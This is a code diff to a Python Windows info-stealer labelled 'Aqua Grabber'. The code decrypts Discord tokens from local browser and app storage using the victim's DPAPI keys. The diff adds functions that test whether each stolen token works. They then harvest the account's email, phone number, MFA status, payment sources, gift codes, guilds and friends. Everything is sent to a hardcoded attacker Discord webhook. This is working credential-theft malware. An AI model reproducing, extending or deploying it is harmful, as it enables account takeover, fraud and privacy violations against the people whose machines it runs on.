@@ -2,11 +2,15 @@ import base64
 import shutil
 import glob
 import subprocess
+from random import randint
+
 import cv2
+import requests
 import win32com.client
 import os
 import re
 from json import loads
+from requests import post
 
 import win32crypt
 
@@ -111,12 +115,62 @@ def getDcToken():
     }
     fileInfo = f"tokens_" + os.getlogin() + ".txt"
 
+    def checkToken(token):
+        response = post(f'https://discord.com/api/v6/invite/{randint(1, 9999999)}', headers={'Authorization': token})
+        if "You need to verify your account in order to perform this action." in str(
+                response.content) or "401: Unauthorized" in str(response.content):
+            return False
+        else:
+            return True
+
     def decrypt_token(buff, master_key):
         try:
             return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
                            buff[3:15]).decrypt(buff[15:])[:-16].decode()
         except:
             pass
+
+    def getUserData(token):
+        TokenUser = requests.get(
+            'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
+        billing = requests.get(
+            'https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
+        guilds = requests.get(
+            'https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
+        friends = requests.get(
+            'https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
+        gift_codes = requests.get(
+            'https://discord.com/api/v9/users/@me/outbound-promotions/codes',
+            headers={'Authorization': token}).json()
+
+        def HasBilling():
+            if str(billing) == "[]":
+                return f"\nBilling : :x:\n\n"
+            else:
+                return f"\nBilling : ```{billing}```"
+
+        def HasGifts():
+            if str(gift_codes) == "[]":
+                return f"\nGift Codes : :x:\n\n"
+            else:
+                return f"\nGift Codes : ```{gift_codes}```"
+
+        username = TokenUser['username'] + '#' + TokenUser['discriminator']
+        user_id = TokenUser['id']
+        email = TokenUser['email']
+        phone = TokenUser['phone']
+        mfa = TokenUser['mfa_enabled']
+        avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{TokenUser['avatar']}.gif" if requests.get(
+            f"https://cdn.discordapp.com/avatars/{user_id}/{TokenUser['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{TokenUser['avatar']}.png"
+        webhook.content = f'```{user} | {username} | HWID: {get_HWID()}```'
+        webhook.add_embed(embed)
+        embed.set_title(f"`{username}` Info")
+        embed.set_image(avatar)
+        embed.set_description(
+            f"Token : ```{token}```\nEmail : ```{email}```\nPhone : ```{phone}```\nHas MFA Enabled? : ```{mfa}```{HasBilling()}{HasGifts()}")
+        webhook.execute()
+        webhook.remove_files()
+        webhook.remove_embeds()
 
     def get_tokens(path):
         cleaned = []
@@ -176,8 +230,9 @@ def getDcToken():
             with open(f"{Aqua}/Info/{fileInfo}", "a") as f:
                 for i in tokens:
                     f.write(str(i) + "\n")
-                    print(f"Found Token : {i}")
-        print("started")
+                    print(f"{i} [{checkToken(i)}]")
+                    if checkToken(i):
+                        getUserData(i)
 
     main_tokens()
 
@@ -190,7 +245,9 @@ def cleanUp():
 webhook_url = 'https://discord.com/api/webhooks/1181292565551656960/CKgsPF6b19sUj6cKdxdOl0PDBWi_IeArbn887nBygG1JCmCTuj3Cg3-kg1bcaNtHlpfq'
 webhook = DiscordWebhook(url=webhook_url)
 embed = DiscordEmbed()
+embed2 = DiscordEmbed()
 webhook.username = "Aqua Grabber"
+webhook.avatar_url = "https://cdn.discordapp.com/attachments/1179144552154673252/1181320259333005373/de750a3b084de1802279c1f42ab0fc33.png?ex=6580a139&is=656e2c39&hm=647afff7f3e0e7e3a7f912ce7da5d30e3599ae61695e0dea54333bbba8d5db02&"
 
 
 def runAqua():
